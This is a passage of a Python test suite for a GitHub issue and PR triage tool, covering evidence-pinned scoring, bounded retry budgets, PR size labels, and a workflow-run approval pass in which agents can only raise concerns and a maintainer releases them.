        (self.root / "data/owner/repo/ledger.jsonl").write_text(json.dumps(changed) + "\n")
        self.assertTrue(self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "issue", "--number", "2")["current"])
        changed["comments_count"] += 1
        (self.root / "data/owner/repo/ledger.jsonl").write_text(json.dumps(changed) + "\n")
        self.assertFalse(self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "issue", "--number", "2")["current"])

        rejected = self.run_cli("item-score", *args, "--snapshot", selected["snapshot_id"], "--clarity", "2", "--support", "2",
                                "--actionability", "1", "--reason", "Clarity 2: Goal is clear. Support 2: Reproduction is complete. Actionability 1: Check it.", "--by", "agent:tester", ok=False)
        self.assertIn("selected evidence revision differs", rejected.stderr)
        self.assertEqual(self.ledger()["issue", 2]["item_score"]["value"], 4)

        self.json_cli("item-score", *args, "--unassessed", "--reason", "Report needs fresh evidence", "--by", "agent:tester")
        shown = self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "issue", "--number", "2")
        self.assertIsNone(shown["score"]["value"])
        self.assertFalse(shown["current"])
        self.assertTrue(shown["assessment_current"])
        self.assertEqual(shown["score"]["revision"]["updated_at"], "2026-09-23T01:00:00Z")
        self.assertEqual(len(self.calls()), calls)

        changed = self.ledger()["issue", 2]
        changed.update(updated_at="2026-09-24T01:00:00Z", comments_count=changed["comments_count"] + 1)
        (self.root / "data/owner/repo/ledger.jsonl").write_text(json.dumps(changed) + "\n")
        self.assertFalse(self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "issue", "--number", "2")["assessment_current"])
        self.assertTrue(any("Score a bounded selection of 1" in row["what"] for row in self.json_cli("next", "--json")["suggestions"]))

        pr = item(1, "A contribution", kind="pr")
        pr["updated_at"] = summary()["updated_at"]
        (self.root / "data/owner/repo/ledger.jsonl").write_text(json.dumps(changed) + "\n" + json.dumps(pr) + "\n")
        partial = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion")
        incomplete = self.run_cli("item-score", "--expected-repo", "owner/repo", "set", "--kind", "pr", "--number", "1",
                                  "--snapshot", partial["snapshot_id"], "--correctness", "1", "--safeguards", "1", "--reviewability", "1",
                                  "--reason", "Correctness 1: A material question remains. Safeguards 1: A partial check exists. Reviewability 1: Scope is focused.",
                                  "--by", "agent:tester", ok=False)
        self.assertIn("complete files, diff", incomplete.stderr)
        self.assertIsNone(self.ledger()["pr", 1].get("item_score"))
        self.json_cli("item-score", "--expected-repo", "owner/repo", "set", "--kind", "pr", "--number", "1",
                      "--snapshot", partial["snapshot_id"], "--unassessed", "--reason", "PR code evidence is incomplete", "--by", "agent:tester")
        partial_score = self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "pr", "--number", "1")
        self.assertTrue(partial_score["assessment_current"])
        self.assertEqual(partial_score["score"]["snapshot_id"], partial["snapshot_id"])
        self.assertEqual(partial_score["score"]["revision"]["head_sha"], "b" * 40)
        self.assertNotEqual(partial_score["score"]["coverage"].get("diff"), "complete")
        self.assertFalse(partial_score["new_evidence"])

        # Once complete code evidence is saved, the unassessed PR is offered for scoring again.
        patch = "@@ -1,1 +1,1 @@\n-old\n+new"
        self.responses["repos/owner/repo/pulls/1"]["data"].update(changed_files=1, additions=1, deletions=1)
        self.responses["repos/owner/repo/pulls/1#diff"] = dict(text="diff --git a/app.py b/app.py\nindex 1111111..2222222 100644\n--- a/app.py\n+++ b/app.py\n" + patch)
        self.responses["repos/owner/repo/pulls/1/files?per_page=100&page=1"] = dict(data=[dict(filename="app.py", status="modified", additions=1, deletions=1, changes=2, patch=patch)])
        complete = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "pr-code", "--mode", "refresh")
        self.assertEqual(complete["components"]["diff"]["status"], "complete")
        self.assertTrue(self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "pr", "--number", "1")["new_evidence"])
        self.assertTrue(any("Score a bounded selection of 2" in row["what"] for row in self.json_cli("next", "--json")["suggestions"]))

        # A refresh that sees the scored PR moved reads its head once: an unchanged head keeps the result current, a new one makes it stale.
        listed = dict(self.ledger()["pr", 1], updated_at="2026-09-25T00:00:00Z")
        self.responses["repos/owner/repo/issues?state=open&per_page=100"] = dict(data=[{key: listed[key] for key in ("number", "kind", "title", "url", "author", "created_at", "updated_at", "state", "state_reason", "labels", "comments_count")}])
        self.run_cli("fetch", "--full")
        self.run_cli("sync")
        self.assertEqual((self.ledger()["pr", 1]["updated_at"], self.ledger()["pr", 1]["head_sha"]), ("2026-09-25T00:00:00Z", "b" * 40))
        self.assertTrue(self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "pr", "--number", "1")["assessment_current"])
        self.responses["repos/owner/repo/pulls/1"]["data"]["head"]["sha"] = "c" * 40
        self.responses["repos/owner/repo/issues?state=open&per_page=100"]["data"][0]["updated_at"] = "2026-09-26T00:00:00Z"
        self.run_cli("fetch", "--full")
        self.run_cli("sync")
        self.assertFalse(self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "pr", "--number", "1")["assessment_current"])

        wrong_repo = self.run_cli("item-score", "--expected-repo", "other/repo", "show", "--kind", "pr", "--number", "1", ok=False)
        self.assertIn("selected repository changed", wrong_repo.stderr)

    def test_empty_graphql_cli_response_uses_bounded_budgeted_retry(self):
        (self.mock / "gh").write_text('''#!/usr/bin/env python3
import json, os, sys
from pathlib import Path
root = Path(os.environ["FAKE_GH_DIR"])
args = sys.argv[1:]
if args[:1] != ["api"] or args[args.index("--method") + 1] != "POST" or args[-1] != "graphql":
    sys.exit("unexpected GitHub operation")
payload = json.load(sys.stdin)
if not payload["query"].startswith("query ClosingIssues"):
    sys.exit("unexpected GraphQL query")
counter = root / "graphql-count"
count = int(counter.read_text()) + 1 if counter.exists() else 1
counter.write_text(str(count))
if (root / "gateway-timeout").exists() and count < 3:
    print("HTTP/2.0 504")
    print()
    sys.exit(1)
print("HTTP/2.0 200")
if (root / "rate-limited").exists():
    print("x-ratelimit-remaining: 0")
print()
if count < 3:
    sys.exit("transient gh transport failure")
print(json.dumps({"data": {"rateLimit": {"remaining": 100}, "node": {"id": "PR_1"}}}))
''')
        code = '''import json
from _acquire import GitHubReader, ReadFailure
reader = GitHubReader("github.com", budget=BUDGET)
try:
    node = reader.closing_page("PR_1", None)
    print(json.dumps({"requests": reader.requests, "node": node}))
except ReadFailure as error:
    print(json.dumps({"requests": reader.requests, "error": str(error)}))
'''
        env = dict(self.env, PYTHONPATH=str(self.root / "bin"))
        first = subprocess.run([sys.executable, "-c", code.replace("BUDGET", "5")], cwd=self.root, env=env,
                               capture_output=True, text=True, check=True)
        self.assertEqual(json.loads(first.stdout), dict(requests=3, node=dict(id="PR_1")))

        (self.mock / "graphql-count").unlink()
        limited = subprocess.run([sys.executable, "-c", code.replace("BUDGET", "2")], cwd=self.root, env=env,
                                 capture_output=True, text=True, check=True)
        failure = json.loads(limited.stdout)
        self.assertEqual(failure["requests"], 2)
        self.assertIn("empty GraphQL response", failure["error"])
        self.assertNotIn("invalid JSON", failure["error"])

        (self.mock / "graphql-count").unlink()
        (self.mock / "gateway-timeout").touch()
        retried = subprocess.run([sys.executable, "-c", code.replace("BUDGET", "5")], cwd=self.root, env=env,
                                 capture_output=True, text=True, check=True)
        self.assertEqual(json.loads(retried.stdout), dict(requests=3, node=dict(id="PR_1")))

        (self.mock / "graphql-count").unlink()
        exhausted = subprocess.run([sys.executable, "-c", code.replace("BUDGET", "2")], cwd=self.root, env=env,
                                   capture_output=True, text=True, check=True)
        self.assertEqual(json.loads(exhausted.stdout)["requests"], 2)
        self.assertIn("HTTP 504", json.loads(exhausted.stdout)["error"])

        (self.mock / "graphql-count").unlink()
        (self.mock / "gateway-timeout").unlink()
        (self.mock / "rate-limited").touch()
        throttled = subprocess.run([sys.executable, "-c", code.replace("BUDGET", "5")], cwd=self.root, env=env,
                                   capture_output=True, text=True, check=True)
        self.assertEqual(json.loads(throttled.stdout)["requests"], 1)
        self.assertIn("rate limit", json.loads(throttled.stdout)["error"])

    def test_git_batch_transfer_retries_transient_failure_within_budget(self):
        (self.mock / "git").write_text('''#!/usr/bin/env python3
import os, sys
from pathlib import Path
root = Path(os.environ["FAKE_GH_DIR"])
args = sys.argv[1:]
if args[:1] == ["-c"]:
    if args[:4] != ["-c", "credential.helper=", "-c", "credential.helper=!gh auth git-credential"]:
        sys.exit("unexpected Git credential helper")
    args = args[4:]
if args[:1] != ["-C"]:
    sys.exit("unexpected Git operation")
if args[2:] == ["rev-parse", "--show-toplevel"]:
    print(root.parent.parent)
elif args[2:] == ["check-ref-format", "refs/heads/main"]:
    pass
elif args[2] == "fetch":
    if "refs/pull/1/head" not in args or "refs/heads/main" not in args:
        sys.exit("PR head or base ref was not fetched")
    counter = root / "git-count"
    count = int(counter.read_text()) + 1 if counter.exists() else 1
    counter.write_text(str(count))
    if (root / "git-hard").exists():
        sys.exit("Repository not found")
    if count < 3:
        sys.exit("RPC failed; transient connection loss")
else:
    sys.exit("unexpected Git operation")
''')
        (self.mock / "git").chmod(0o755)
        code = '''import json
from types import SimpleNamespace
from _acquire import ReadFailure
from _bulk import git_heads
reader = SimpleNamespace(requests=0, budget=5, stopped=None)
cache = SimpleNamespace(identity={"host": "github.com", "full_name": "owner/repo"})
try:
    git_heads(reader, cache, [{"number": 1}], {1: {"baseRefName": "main"}})
    print(json.dumps({"requests": reader.requests, "status": "complete"}))
except ReadFailure as error:
    print(json.dumps({"requests": reader.requests, "error": str(error)}))
'''
        env = dict(self.env, PYTHONPATH=str(self.root / "bin"))
        result = subprocess.run([sys.executable, "-c", code], cwd=self.root, env=env, capture_output=True, text=True, check=True)
        self.assertEqual(json.loads(result.stdout), dict(requests=3, status="complete"))

        (self.mock / "git-count").unlink()
        (self.mock / "git-hard").touch()
        hard = subprocess.run([sys.executable, "-c", code], cwd=self.root, env=env, capture_output=True, text=True, check=True)
        self.assertEqual(json.loads(hard.stdout)["requests"], 1)
        self.assertIn("repository access", json.loads(hard.stdout)["error"])

    def test_bulk_corpus_snapshot_reads_checks_and_keeps_earlier_components(self):
        sha = "b" * 40
        reviews = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "pr-context", "--mode", "refresh")

        # A fork PR whose run waits for approval: GitHub has created its suite but no check run yet. The fork's own commit is read too, as the REST collector reads both repositories.
        suite = dict(databaseId=10, status="COMPLETED", conclusion="ACTION_REQUIRED", createdAt="2026-09-22T02:00:00Z", updatedAt="2026-09-22T02:00:00Z",
                     app=dict(databaseId=11, slug="github-actions", name="GitHub Actions"), repository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"),
                     workflowRun=dict(databaseId=30, event="pull_request", workflow=dict(name="Fork checks")), checkRuns=dict(totalCount=0, pageInfo=dict(hasNextPage=False), nodes=[]))
        status = dict(id="SC_1", context="ci/lint", state="SUCCESS", targetUrl="https://ci.example.com/1", createdAt="2026-09-22T02:00:00Z")
        commit = dict(oid=sha, checkSuites=dict(totalCount=1, pageInfo=dict(hasNextPage=False), nodes=[suite]), status=dict(contexts=[status]))
        node = self.bulk_node(commit, headRepository=dict(id="R_fork", databaseId=43, nameWithOwner="fork/repo"),
                              forkCommit=dict(object=dict(oid=sha, checkSuites=dict(totalCount=0, pageInfo=dict(hasNextPage=False), nodes=[]), status=None)))
        manifest = self.bulk_batch(node)
        self.assertNotEqual(manifest["snapshot_id"], reviews["snapshot_id"])
        self.assertTrue({"checks", "reviews"} <= set(manifest["requested_components"]))
        self.assertEqual(manifest["items"][0]["components"]["checks"]["source"]["transport"], "graphql")
        before = len(self.calls())
        offline = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--mode", "offline")
        self.assertEqual(len(self.calls()), before)
        self.assertEqual((offline["snapshot_id"], offline["coverage"], offline["result_counts"]["pending"], offline["result_counts"]["passed"]), (manifest["snapshot_id"], "complete", 1, 1))
        waiting = next(row for row in offline["rows"] if row["source"] == "check-suite")
        self.assertEqual((waiting["name"], waiting["conclusion"], waiting["result"]), ("Fork checks", "action_required", "pending"))

        # Without the fork's own commit, coverage is partial rather than silently complete.
        manifest = self.bulk_batch(dict(node, forkCommit=None))
        self.assertEqual(manifest["items"][0]["components"]["checks"]["status"], "partial")
        self.assertIn("fork/repo", manifest["items"][0]["components"]["checks"]["error"])

    def test_partial_latest_observation_remains_visible(self):
        first = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion")
        self.responses["repos/owner/repo/pulls/1"] = dict(data=summary(head=dict(sha="c" * 40, repo=repository())))
        partial = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion", "--mode", "refresh", "--request-budget", "2")
        self.assertNotEqual(partial["snapshot_id"], first["snapshot_id"])
        latest = self.cache("read", "--kind", "pr", "--number", "1", "--profile", "discussion")
        self.assertEqual(latest["snapshot_id"], partial["snapshot_id"])
        self.assertTrue(any(latest["problems"].values()))
        old = self.cache("read", "--kind", "pr", "--number", "1", "--profile", "discussion", "--snapshot", first["snapshot_id"])
        self.assertFalse(any(old["problems"].values()))

    def test_inventory_summary_is_partial_and_separate_from_ledger(self):
        snapshot = self.import_inventory()
        self.assertFalse((self.root / "data/owner/repo/ledger.jsonl").exists())
        before = len(self.calls())
        record = self.cache("read", "--kind", "pr", "--number", "1", "--profile", "discussion", "--snapshot", snapshot)
        self.assertEqual(record["problems"]["summary"], ["partial"])
        self.assertEqual(record["problems"]["comments"], ["missing"])
        self.assertIsNone(record["identity"]["database_id"])
        self.assertEqual(len(self.calls()), before)

        self.run_cli("sync")
        row = self.ledger()[("pr", 1)]
        self.assertNotIn("body", row)
        self.assertIsNone(row["review_request"])

        spec = importlib.util.spec_from_file_location("evaluation_seed", ROOT / "tests-playbooks/seed/seed.py")
        seed = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(seed)
        self.responses["repos/owner/repo/issues?state=open&per_page=100"] = dict(data=[row])
        self.save_responses()
        before = len(self.calls())

        with patch.dict(os.environ, self.env):
            seed.refresh_inventory(self.root, "owner/repo")

        self.assertEqual(len(self.calls()), before + 2)
        before = len(self.calls())
        snapshot = self.cache("import-inventory")["snapshot_id"]
        corpus = self.cache("corpus-create", "--snapshot", snapshot, "--scope", "open-items", "--profile", "backlog")["corpus_id"]
        status = self.cache("corpus-status", corpus)
        self.assertEqual(status["plan"]["repository"]["database_id"], 42)
        self.assertEqual([(member["kind"], member["number"]) for member in status["plan"]["members"]], [("pr", 1)])
        self.assertEqual(status["counts"]["pending"], 1)
        record = self.cache("read", "--kind", "pr", "--number", "1", "--snapshot", snapshot)
        self.assertEqual(record["problems"]["summary"], ["partial"])
        self.assertEqual(record["problems"]["comments"], ["missing"])
        self.assertIsNone(record["identity"]["database_id"])
        self.assertFalse(self.ledger()[("pr", 1)]["action"])
        self.assertEqual(len(self.calls()), before)

    def test_frozen_search_stays_offline(self):
        snapshot = self.import_inventory()
        before = len(self.calls())
        result = self.cache("search", "--snapshot", snapshot, "--query", "Useful", "--component", "summary")
        self.assertEqual(result["matched_items"], 1)
        self.assertEqual(result["items"][0]["match"]["pointer"], "/body")
        self.assertEqual(len(self.calls()), before)

    def test_corpus_membership_is_frozen(self):
        snapshot = self.import_inventory()
        corpus = self.cache("corpus-create", "--snapshot", snapshot, "--scope", "open-prs", "--profile", "discussion")["corpus_id"]
        self.import_inventory([self.inventory_row(1), self.inventory_row(2)])
        before = len(self.calls())
        status = self.cache("corpus-status", corpus)
        self.assertEqual(status["plan"]["inventory_snapshot"], snapshot)
        self.assertEqual(len(status["plan"]["members"]), 1)
        self.assertEqual(len(self.calls()), before)

    def test_corpus_run_publishes_pinned_item_evidence(self):
        snapshot = self.import_inventory()
        corpus = self.cache("corpus-create", "--snapshot", snapshot, "--scope", "open-prs", "--profile", "discussion")["corpus_id"]
        interrupted = self.cache("corpus-run", corpus, "--request-budget", "1")
        self.assertEqual(interrupted["counts"]["complete"], 0)
        result = self.cache("corpus-run", corpus, "--request-budget", "100")
        self.assertEqual(result["counts"]["complete"], 1)
        before = len(self.calls())
        listing = self.cache("corpus-list", corpus)
        self.assertEqual(listing["items"][0]["identity"]["number"], 1)
        self.assertEqual(len(self.calls()), before)

    def test_pr_size_uses_pinned_counts_and_separate_write_authorization(self):
        snapshot = self.import_inventory()
        self.run_cli("sync")
        corpus = self.cache("corpus-create", "--snapshot", snapshot, "--scope", "open-prs", "--profile", "discussion")["corpus_id"]
        self.cache("corpus-run", corpus, "--request-budget", "100")
        args = ("--expected-repo", "owner/repo")
        before = len(self.calls())
        preview = self.json_cli("pr-size", "run", *args, "--corpus", corpus)
        self.assertEqual(preview["proposed"][0]["label"], "Size: S")
        self.assertEqual(self.json_cli("pr-size", "run", *args, "--corpus", corpus, "--apply")["enabled"], False)
        self.assertEqual(len(self.calls()), before)
        policy = self.json_cli("pr-size", "status", *args)
        self.json_cli("pr-size", "set-enabled", *args, "--enabled", "on", "--expected-revision", policy["revision"])
        self.run_cli("pr-size", "set-enabled", *args, "--enabled", "off", "--expected-revision", policy["revision"], ok=False)

        # Exercise the boundaries independently of transport or agent suggestions.
        script = self.root / "bin/size-boundaries"
        script.write_text('''#!/usr/bin/env python3
from _pr_size import classify
for lines, files, expected in [(50,3,"S"),(51,3,"M"),(50,4,"M"),(250,10,"M"),(251,10,"L"),(250,11,"L"),(1000,25,"L"),(1001,25,"XL"),(1000,26,"XL")]:
    assert classify(lines // 2, lines - lines // 2, files) == "Size: " + expected
for values in [(True,0,0),(-1,0,0),(0,0,None)]:
    try:
        classify(*values)
    except ValueError:
        continue
    raise AssertionError(values)
''')
        script.chmod(0o755)
        self.run_cli("size-boundaries")

        live = summary(labels=[dict(name="keep"), dict(name="Size: XL")])
        (self.mock / "size-item.json").write_text(json.dumps(live))
        (self.mock / "size-labels.json").write_text("[]")
        (self.mock / "gh").write_text('''#!/usr/bin/env python3
import json, os, sys
from pathlib import Path
from urllib.parse import unquote
root = Path(os.environ["FAKE_GH_DIR"])
args = sys.argv[1:]
method = args[args.index("--method") + 1]
endpoint = args[args.index("--method") + 2]
body = json.load(sys.stdin) if "--input" in args else None
with (root / "size-calls.jsonl").open("a") as out:
    out.write(json.dumps(dict(method=method, endpoint=endpoint, body=body)) + "\\n")
item_path, labels_path = root / "size-item.json", root / "size-labels.json"
item, labels = json.loads(item_path.read_text()), json.loads(labels_path.read_text())
if method == "GET" and endpoint == "repos/owner/repo":
    result = dict(full_name="owner/repo", id=42, node_id="R_repo")
elif method == "GET" and endpoint == "repos/owner/repo/labels?per_page=100&page=1":
    result = labels
elif method == "POST" and endpoint == "repos/owner/repo/labels":
    labels.append(dict(body, id=len(labels) + 1))
    labels_path.write_text(json.dumps(labels))
    result = labels[-1]
elif method == "GET" and endpoint == "repos/owner/repo/pulls/1":
    result = item
elif method == "POST" and endpoint == "repos/owner/repo/issues/1/labels":
    if (root / "size-fail").exists():
        sys.exit("connection lost")
    item["labels"].extend(dict(name=name) for name in body["labels"])
    item_path.write_text(json.dumps(item))
    result = item["labels"]
elif method == "DELETE" and endpoint.startswith("repos/owner/repo/issues/1/labels/"):
    item["labels"] = [row for row in item["labels"] if row["name"] != unquote(endpoint.rsplit("/",1)[1])]
    item_path.write_text(json.dumps(item))
    result = item["labels"]
else:
    sys.exit("unexpected size request: " + method + " " + endpoint)
print(json.dumps(result))
''')
        result = self.json_cli("pr-size", "run", *args, "--corpus", corpus, "--apply")
        self.assertEqual(result["written"][0]["label"], "Size: S")
        self.assertEqual(set(self.ledger()[("pr", 1)]["labels"]), {"keep", "Size: S"})
        definitions = json.loads((self.mock / "size-labels.json").read_text())
        self.assertEqual({row["name"]: row["color"] for row in definitions}, {"Size: S": "90EE90", "Size: M": "9ACD32", "Size: L": "FF4500", "Size: XL": "FF0000"})
        saved_labels = json.loads((self.root / "config/taxonomy.json").read_text())["label_catalog"]["labels"]
        self.assertEqual({row["name"] for row in saved_labels if row["name"].startswith("Size: ")}, {"Size: S", "Size: M", "Size: L", "Size: XL"})
        live["head"]["sha"] = "c" * 40
        (self.mock / "size-item.json").write_text(json.dumps(live))
        stale = self.json_cli("pr-size", "run", *args, "--corpus", corpus, "--apply")
        self.assertEqual(stale["written"], [])
        self.assertIn("differs", stale["skipped"][0]["reason"])
        live["head"]["sha"] = "b" * 40
        (self.mock / "size-item.json").write_text(json.dumps(live))
        (self.mock / "size-fail").touch()
        self.run_cli("pr-size", "run", *args, "--corpus", corpus, "--apply", ok=False)
        self.assertEqual(self.json_cli("pr-size", "status", *args)["pending"], ["pr:1"])
        count = len((self.mock / "size-calls.jsonl").read_text().splitlines())
        self.run_cli("pr-size", "run", *args, "--corpus", corpus, "--apply", ok=False)
        self.assertEqual(len((self.mock / "size-calls.jsonl").read_text().splitlines()), count)

    def test_corrupt_selected_payload_is_never_read_as_evidence(self):
        result = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion")
        manifest = self.cache("show", result["snapshot_id"])
        reference = manifest["items"][0]["components"]["summary"]["object"]
        object_path = next((self.root / "data/owner/repo/cache/objects").glob(reference["sha256"] + "*"))
        object_path.write_text("damaged")
        before = len(self.calls())
        self.run_cli("cache", "read", "--kind", "pr", "--number", "1", "--profile", "discussion", ok=False)
        self.assertEqual(len(self.calls()), before)

    def test_workflow_runs_awaiting_approval_are_flagged_offline_from_pinned_evidence(self):
        # The base commit's workflows are read from the install's own checkout, so the install moves into a real repository.
        checkout = Path(self.root.parent) / (self.root.name + "-checkout")
        self.addCleanup(shutil.rmtree, checkout, True)
        (checkout / ".github/workflows").mkdir(parents=True)
        (checkout / ".github/workflows/ci.yml").write_text("on: pull_request\njobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n    steps:\n      - run: ./scripts/test.sh\n")
        git = ("git", "-c", "user.name=Test", "-c", "user.email=test@example.com", "-C", str(checkout))
        subprocess.run([*git, "init", "-q"], check=True)
        subprocess.run([*git, "add", "."], check=True)
        subprocess.run([*git, "commit", "-q", "-m", "base"], check=True)
        base = subprocess.run([*git, "rev-parse", "HEAD"], check=True, capture_output=True, text=True).stdout.strip()
        shutil.move(self.root, checkout / "triage-o-mator")
        self.root.mkdir()
        self.root, self.mock = checkout / "triage-o-mator", checkout / "triage-o-mator/mock"
        self.env.update(PATH=str(self.mock) + os.pathsep + os.environ["PATH"], FAKE_GH_DIR=str(self.mock))

        head = "b" * 40
        pull = self.responses["repos/owner/repo/pulls/1"]["data"]
        pull["base"]["sha"] = base
        runs = f"repos/owner/repo/actions/runs?status=action_required&head_sha={head}&per_page=100&page=1"
        run = dict(id=7, name="CI", path=".github/workflows/ci.yml", event="pull_request", status="completed", conclusion="action_required", head_sha=head,
                   head_repository=dict(full_name="owner/repo"), repository=repository(), run_attempt=1, html_url="https://github.com/owner/repo/actions/runs/7")
        self.responses[runs] = dict(data=dict(total_count=1, workflow_runs=[run]))

        def change(files):
            blocks, rows = [], []
            for name, patch_text in files:
                blocks.append(f"diff --git a/{name} b/{name}\nindex 1111111..2222222 100644\n--- a/{name}\n+++ b/{name}\n{patch_text}")
                rows.append(dict(filename=name, status="modified", additions=patch_text.count("\n+"), deletions=patch_text.count("\n-"), changes=0, patch=patch_text))
            pull.update(changed_files=len(rows), additions=sum(row["additions"] for row in rows), deletions=sum(row["deletions"] for row in rows))
            self.responses["repos/owner/repo/pulls/1#diff"] = dict(text="\n".join(blocks))
            self.responses["repos/owner/repo/pulls/1/files?per_page=100&page=1"] = dict(data=rows)
            return self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "pr-code", "--mode", "refresh")["snapshot_id"]

        args = ("--expected-repo", "owner/repo", "--number", "1")
        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+new")])
        before = len(self.calls())
        listed = self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
        self.assertEqual(([value["id"] for value in listed["runs"]], listed["requests"]), ([7], 2))
        self.assertTrue(all(call[call.index("--method") + 1] == "GET" for call in self.calls()[before:]))
        offline = len(self.calls())
        normal = self.json_cli("workflow-runs", "assess", *args)
        self.assertEqual((normal["counts"], normal["pr_flags"], normal["runs"][0]["flags"]), (dict(normal=1, suspicious=0), [], []))
        self.assertEqual(self.json_cli("workflow-runs", "assess", *args)["checksum"], normal["checksum"])
        self.assertEqual(len(self.calls()), offline)
        reused = self.json_cli("workflow-runs", "list", *args, "--acquire")
        self.assertEqual((reused["snapshot_id"], reused["requests"]), (snapshot, 2))

        # Approval posts only through a wrapper that answers the approve endpoint; every other request stays with the strict read-only fake.
        shutil.move(self.mock / "gh", self.mock / "gh-read")
        (self.mock / "gh").write_text('''#!/usr/bin/env python3
import json, os, sys
from pathlib import Path
root = Path(os.environ["FAKE_GH_DIR"])
args = sys.argv[1:]
if "POST" in args and args[-1].endswith("/approve"):
    with (root / "calls.jsonl").open("a") as out:
        out.write(json.dumps(args) + "\\n")
    status = (root / "approve-status").read_text().strip() if (root / "approve-status").exists() else "201"
    if status == "lost":
        sys.exit("connection reset")
    print("HTTP/2.0 " + status)
    print()
    print(json.dumps(dict(message="Must have write access")) if status != "201" else "")
    sys.exit(0 if status == "201" else 1)
os.execv(str(root / "gh-read"), [str(root / "gh-read"), *args])
''')
        (self.mock / "gh").chmod(0o755)
        self.responses["repos/owner/repo/actions/runs/7"] = dict(data=run)
        posts = lambda: [call[-1] for call in self.calls() if "POST" in call]

        # The pass is off by default and an agent never approves outside it; a person's dry run binds the runs, their state and holds.
        self.assertIn("off", self.run_cli("workflow-runs", "pass-preview", *args, ok=False).stderr)
        self.assertIn("only through the pass", self.run_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "agent:ci", ok=False).stderr)
        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "maintainer")
        self.assertEqual((dry["plan"]["head_sha"], dry["plan"]["runs"][0]["state"], dry["plan"]["assessment_checksum"]), (head, "normal", self.json_cli("workflow-runs", "assess", *args)["checksum"]))
        mode = self.json_cli("workflow-runs", "mode", "--expected-repo", "owner/repo")
        self.assertEqual(self.json_cli("workflow-runs", "mode", "--expected-repo", "owner/repo", "--set", "execute", "--expected-revision", mode["revision"])["mode"], "execute")

        # An agent's concern stages the run; only a person releases it, and the note stays as history.
        self.assertIn("needs a reason", self.run_cli("workflow-runs", "hold", *args, "--run", "7", "--head", head, "--by", "agent:ci", ok=False).stderr)
        concern = self.json_cli("workflow-runs", "hold", *args, "--run", "7", "--head", head, "--by", "agent:ci", "--reason", "The test script now reads a token")["notes"][0]
        self.assertEqual(concern["kind"], "concern")
        staged = self.json_cli("workflow-runs", "pass-preview", *args)["plan"]["items"][0]["runs"][0]
        self.assertEqual((staged["mode"], staged["reasons"]), ("stage", ["agent concern from agent:ci"]))
        self.assertEqual(self.run_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "agent:ci", "--automation", ok=False).returncode, 3)
        self.assertIn("cannot release", self.run_cli("workflow-runs", "release", *args, "--note", concern["id"], "--by", "agent:ci", ok=False).stderr)
        self.json_cli("workflow-runs", "release", *args, "--note", concern["id"], "--by", "maintainer")
        self.assertEqual(self.json_cli("workflow-runs", "assess", *args)["local"]["notes"][0]["released"]["by"], "maintainer")

        # A normal, unheld run is approved by the pass after a live recheck of the PR and the run, with one POST.
        preview = self.json_cli("workflow-runs", "pass-preview", *args)
        self.assertEqual(preview["plan"]["items"][0]["runs"][0]["mode"], "execute")
        before = len(self.calls())
        passed = self.json_cli("workflow-runs", "pass-run", *args, "--by", "agent:ci", "--preview-sha256", preview["preview_sha256"])
        self.assertEqual([(row["run_id"], row["status"], row["actor"]) for row in passed["results"]], [(7, "approved", "automation")])
        self.assertEqual([call[-1] for call in self.calls()[before:]], ["repos/owner/repo/pulls/1", "repos/owner/repo/actions/runs/7", "repos/owner/repo/actions/runs/7/approve"])
        self.assertEqual(self.json_cli("workflow-runs", "pass-preview", *args)["plan"]["items"][0]["runs"][0]["mode"], "approved")

        # A permission refusal is definite; a lost reply is unknown, stops, and is never posted again for the same request.
        self.responses[runs] = dict(data=dict(total_count=2, workflow_runs=[run, dict(run, id=9)]))
        self.responses["repos/owner/repo/actions/runs/9"] = dict(data=dict(run, id=9))
        self.json_cli("workflow-runs", "list", *args, "--acquire")
        (self.mock / "approve-status").write_text("403")
        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer")
        refused = self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer", "--publish", "--request-id", dry["plan"]["request_id"], "--approve", dry["approval"])
        self.assertEqual([(row["status"], row["http_status"]) for row in refused["results"]], [("refused", 403)])
        (self.mock / "approve-status").write_text("lost")
        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer")
        self.assertEqual(dry["plan"]["runs"][0]["earlier"], [dict(request_id=refused["request_id"], status="refused")])
        publish = ("--publish", "--request-id", dry["plan"]["request_id"], "--approve", dry["approval"])
        lost = self.run_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer", *publish, ok=False)
        self.assertEqual(json.loads(lost.stdout)["results"][0]["status"], "unknown")
        count = len(posts())
        self.assertTrue(self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer", *publish)["repeated"])
        self.assertEqual(len(posts()), count)
        self.assertIn("uncertain", self.json_cli("workflow-runs", "pass-preview", *args)["plan"]["items"][0]["runs"][1]["reasons"][0])
        row = self.json_cli("workflow-runs", "inbox", "--expected-repo", "owner/repo")["rows"][0]
        self.assertEqual(([entry["status"] for entry in row["outcomes"]], row["uncertain"], [entry["id"] for entry in row["waiting"]]), (["approved", "refused", "unknown"], 1, [7, 9]))

        # A moved head refuses before any write.
        (self.mock / "approve-status").unlink()
